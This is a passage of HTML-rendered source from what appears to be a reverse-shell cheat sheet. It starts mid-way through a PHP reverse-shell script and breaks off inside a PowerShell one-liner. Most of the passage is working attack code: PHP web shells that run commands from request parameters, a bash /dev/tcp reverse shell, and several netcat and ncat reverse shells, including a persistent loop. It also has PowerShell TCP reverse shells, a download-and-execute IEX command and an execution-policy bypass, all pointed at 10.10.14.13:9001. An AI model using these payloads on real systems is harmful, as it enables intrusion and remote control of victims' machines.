class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;STDERR READ\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$chunk_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;STDERR: \u003c/span\u003e\u003cspan class=\"si\"\u003e$input\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eproc_close\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$process\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eprintit\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$string\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nv\"\u003e$daemon\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e$string\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"php-command-execution\"\u003ePHP Command Execution\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Simple PHP command execution\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \u003cspan class=\"nx\"\u003esystem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cmd\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e \u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e# More advanced web shell\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u0026lt;?php \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003eif(isset($_GET[\u0026#39;cmd\u0026#39;])) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e    echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_GET[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e?\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e# POST request shell\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e# POST /shell.php\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e# cmd=bash -c \u0026#39;bash -i /dev/tcp/10.10.14.13/9001 0\u0026gt;\u0026amp;1\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"netcat-reverse-shells\"\u003eNetcat Reverse Shells\u003c/h2\u003e\n\u003ch3 id=\"traditional-netcat\"\u003eTraditional Netcat\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic netcat reverse shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -e /bin/sh 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Alternative if -e is not available\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erm /tmp/f\u003cspan class=\"p\"\u003e;\u003c/span\u003emkfifo /tmp/f\u003cspan class=\"p\"\u003e;\u003c/span\u003ecat /tmp/f\u003cspan class=\"p\"\u003e|\u003c/span\u003e/bin/sh -i 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e1\u003cspan class=\"p\"\u003e|\u003c/span\u003enc 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e \u0026gt;/tmp/f\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Using ncat (Nmap\u0026#39;s netcat)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003encat 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e -e /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# OpenBSD netcat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e -e /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"advanced-netcat\"\u003eAdvanced Netcat\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Netcat with PTY\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -e /bin/bash 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Netcat persistent shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e nc -e /bin/bash 10.10.14.13 9001\u003cspan class=\"p\"\u003e;\u003c/span\u003e sleep 60\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# UDP reverse shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -u 10.10.14.13 \u003cspan class=\"m\"\u003e9001\u003c/span\u003e -e /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"powershell-reverse-shells-windows\"\u003ePowerShell Reverse Shells (Windows)\u003c/h2\u003e\n\u003ch3 id=\"basic-powershell\"\u003eBasic PowerShell\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Simple PowerShell reverse shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epowershell\u003c/span\u003e \u003cspan class=\"n\"\u003e-nop\u003c/span\u003e \u003cspan class=\"n\"\u003e-c\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"s2\"\u003e = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.10.14.13\u0026#39;,9001);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"s2\"\u003e.GetStream();[byte[]]\u003c/span\u003e\u003cspan class=\"nv\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"s2\"\u003e = 0..65535|%{0};while((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Read(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"s2\"\u003e, 0, \u003c/span\u003e\u003cspan class=\"nv\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Length)) -ne 0){;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"s2\"\u003e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"s2\"\u003e,0, \u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendback\u003c/span\u003e\u003cspan class=\"s2\"\u003e = (iex \u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"s2\"\u003e 2\u0026gt;\u0026amp;1 | Out-String );\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendback2\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendback\u003c/span\u003e\u003cspan class=\"s2\"\u003e + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendbyte\u003c/span\u003e\u003cspan class=\"s2\"\u003e = ([text.encoding]::ASCII).GetBytes(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendback2\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Write(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendbyte\u003c/span\u003e\u003cspan class=\"s2\"\u003e,0,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendbyte\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Length);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Flush()};\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Close()\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Base64 encoded PowerShell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epowershell\u003c/span\u003e \u003cspan class=\"n\"\u003e-enc\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003ebase64_encoded_command\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Download and execute\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epowershell\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://10.10.14.13/shell.ps1\u0026#39;)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"advanced-powershell\"\u003eAdvanced PowerShell\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# PowerShell with authentication bypass\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epowershell\u003c/span\u003e \u003cspan class=\"n\"\u003e-ExecutionPolicy\u003c/span\u003e \u003cspan class=\"n\"\u003eBypass\u003c/span\u003e \u003cspan class=\"o\"\u003e-File\u003c/span\u003e \u003cspan class=\"n\"\u003eshell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eps1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# PowerShell one-liner (formatted)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eNet\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eSockets\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eTCPClient\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;10.10.14.13\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mf\"\u003e9001\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetStream\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003ebyte[]\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"nv\"\u003e$bytes\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mf\"\u003e.65535\u003c/span\u003e\u003cspan class=\"p\"\u003e|%{\u003c/span\u003e\u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eRead\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eLength\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e-ne\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"n\"\u003e-TypeName\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eText\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eASCIIEncoding\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eGetString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$sendback\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eiex \u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"mf\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026amp;\u003c/span\u003e\u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eOut-String\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$sendback2\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$sendback\u003c/span\u003e \u003cspan class=\"p\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;PS \u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003ePath\u003c/span\u003e \u003cspan class=\"p\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026gt; \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$sendbyte\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003etext.encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eASCII\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eGetBytes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 